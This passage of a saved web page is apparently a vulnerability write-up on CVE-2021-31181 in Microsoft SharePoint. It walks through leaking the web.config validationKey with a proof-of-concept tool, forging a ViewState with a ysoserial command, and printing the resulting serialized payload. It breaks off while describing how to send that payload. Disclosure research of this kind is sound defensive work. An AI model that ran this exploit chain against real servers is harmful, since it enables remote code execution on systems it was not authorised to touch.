                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png" data-image-dimensions="468x240" data-image-focal-point="0.5,0.5" alt="Picture7.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture7.png" width="468" height="240" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647173192-3EMUHECD1YJ8D4RNIBIA/Picture7.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1622577090871_82471"><div class="sqs-block-content"><p>Now we use our PoC to send a request to the server. We need to provide the base URL for our site, valid user credentials, the title of an SPList, and the webId. In our case:  </p>
<p><code>&gt;PoC.exe http://sp2019/sites/ts01/ user2 P@ssw0rd contoso "Documents" "{6e7040c8-0338-4448-914d-a7061e0fc347}"</code></p>
<p>If this step successful, we will get the <b data-preserve-html-node="true">machineKey</b> section of <b data-preserve-html-node="true">web.config</b>:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_114037"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_207">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_206">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_205">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_204">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_203">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:51.92307662963867%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_202">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png" data-image-dimensions="468x243" data-image-focal-point="0.5,0.5" alt="Picture9.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture9.png" width="468" height="243" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647414958-ADHC1O6UPX7Z4E5M2N1C/Picture9.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1622577090871_115951"><div class="sqs-block-content"><p>For our RCE attack, we need the value of <b data-preserve-html-node="true">validationKey</b>. In this example it is:   </p>
<p><code>validationKey=”FAB45BC67E06323C48951DA2AEAF077D8786291E2748330F03B6601F09523B79”</code></p>
<p>We can also see the algorithm: <b data-preserve-html-node="true">validation="HMACSHA256"</b></p>
<p>Using this information, we can proceed to get remote code execution. Before the actual attack, let’s go to the target SharePoint Server and open <b data-preserve-html-node="true">C:\windows\temp</b> folder:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_118770"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_223">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_222">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_221">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_220">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_219">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:16.452991485595703%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_218">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png" data-image-dimensions="468x77" data-image-focal-point="0.5,0.5" alt="Picture10.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture10.png" width="468" height="77" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647486617-LPTJPYFFNZ0FXGHHPMIL/Picture10.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1622577090871_122690"><div class="sqs-block-content"><p>Note that there is no <b data-preserve-html-node="true">PoC_SPRCE01.txt</b> file yet. </p>
<p>Now let’s go back to the attacker machine. We need to collect one more piece of information, which is the value of <code>__VIEWSTATEGENERATOR</code>. We can get this by browsing to the <b data-preserve-html-node="true">success.aspx</b> page on our site. In this example, the URL is <code>http://sp2019/sites/ts01/_layouts/15/success.aspx</code>:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_124525"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_239">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_238">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_237">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_236">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_235">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:28.418804168701172%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_234">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png" data-image-dimensions="468x133" data-image-focal-point="0.5,0.5" alt="Picture11.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture11.png" width="468" height="133" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647600592-7F94G5WDW29MRN0QWJQ5/Picture11.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1622577090871_126425"><div class="sqs-block-content"><p>Viewing the source code, we can find the value of <code>__VIEWSTATEGENERATOR</code>:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_128194"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_255">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_254">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_253">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_252">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_251">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:20.512821197509766%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_250">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png" data-image-dimensions="468x96" data-image-focal-point="0.5,0.5" alt="Picture12.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture12.png" width="468" height="96" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647642882-0PMXBOEX179K0QMJUV7P/Picture12.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1622577090871_129936"><div class="sqs-block-content"><p>In this example it is <b data-preserve-html-node="true">AF878507</b>.</p>
<p>In summary, the values needed to forge a <b data-preserve-html-node="true">VIEWSTATE</b> are as follows:</p>
<p><code>__VIEWSTATEGENERATOR=AF878507</code>
<code>validationKey=FAB45BC67E06323C48951DA2AEAF077D8786291E2748330F03B6601F09523B79</code>
<code>validationAlg=HMACSHA256</code></p>
<p>We provide these values on the command line of ysoserial, as follows: </p>
<p><code>&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo RCE &gt; c:/windows/temp/PoC_SPRCE01.txt" --generator="AF878507" --validationkey="FAB45BC67E06323C48951DA2AEAF077D8786291E2748330F03B6601F09523B79"  --validationalg="HMACSHA256" --islegacy --minify</code></p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_132757"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_271">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_270">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_269">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_268">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_267">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:35.25640869140625%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_266">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png" data-image-dimensions="468x165" data-image-focal-point="0.5,0.5" alt="Picture13.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture13.png" width="468" height="165" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647714196-5HBV5XW0CCO39VZN8DCH/Picture13.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_134523"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">The result is a valid <strong>VIEWSTATE</strong>.</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/7e37c0396af6df9a2ce5099d490eb1c4.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1622577090871_135068"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_83" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/7e37c0396af6df9a2ce5099d490eb1c4..download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/gist-embed-0ac919313390.css"><div id="gist109841578" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-31181-snippet-6-console" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-text  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-31181-snippet-6.console content, created by zdi-team on 03:08PM on June 01, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-31181-snippet-6.console">
        <tbody><tr>
          <td id="file-cve-2021-31181-snippet-6-console-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-31181-snippet-6-console-LC1" class="blob-code blob-code-inner js-file-line">/wEy3AcAAQAAAP////8BAAAAAAAAAAwCAAAABlN5c3RlbQUBAAAAQFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLG1zY29ybGliXV0EAAAABUNvdW50CENvbXBhcmVyB1ZlcnNpb24FSXRlbXMAAQABCAgCAAAAAgAAAAkDAAAAAAAAAAkEAAAABAMAAABAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmddXQEAAAALX2NvbXBhcmlzb24BCQUAAAARBAAAAAIAAAAGBgAAAC0vYyBlY2hvIFJDRSA+IGM6L3dpbmRvd3MvdGVtcC9Qb0NfU1BSQ0UwMS50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQABeAEBAQkIAAAADQANAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQASdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAQEBAQEGCwAAAJIBU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZ10sW1N5c3RlbS5TdHJpbmddLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyxTeXN0ZW0sVmVyc2lvbj00LjAuMC4wLEN1bHR1cmU9bmV1dHJhbCxQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAAhtc2NvcmxpYg0ABg0AAABGU3lzdGVtLFZlcnNpb249NC4wLjAuMCxDdWx0dXJlPW5ldXRyYWwsUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAAXgHAAAAAAAAAAAAAAEBAQEBAAEIDQANAA0ADQANAAAAAAABCgAAAAkAAAAGFgAAAAdDb21wYXJlDQAGGAAAAA1TeXN0ZW0uU3RyaW5nDQANAAAAAAANAAEQAAAACAAAAAYbAAAAJFN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmddXQkMAAAADQAJDAAAAAkYAAAACRYAAAALhqX97I/Upin/LFY1lHJk6pjbx4nmnEzAF9w7RTqd6co=</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/7e37c0396af6df9a2ce5099d490eb1c4/raw/b4538efdd59acd0a3b062b907af668243376d172/CVE-2021-31181-snippet-6.console" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/7e37c0396af6df9a2ce5099d490eb1c4#file-cve-2021-31181-snippet-6-console" class="Link--inTextBlock">
          CVE-2021-31181-snippet-6.console
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_135780"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">We need to URL-encode this ViewState and send it as a <strong>__VIEWSTATE</strong> parameter to our server. For example, this can be done by composing a URL with a <strong>__VIEWSTATE</strong> query string parameter, as follows:</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/dfecdc33528355538912bfd620cd63e3.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1622577090871_136304"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_86" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/dfecdc33528355538912bfd620cd63e3..download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/gist-embed-0ac919313390.css"><div id="gist109841661" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-31181-snippet-7-console" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-text  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-31181-snippet-7.console content, created by zdi-team on 03:10PM on June 01, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-31181-snippet-7.console">
        <tbody><tr>
          <td id="file-cve-2021-31181-snippet-7-console-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
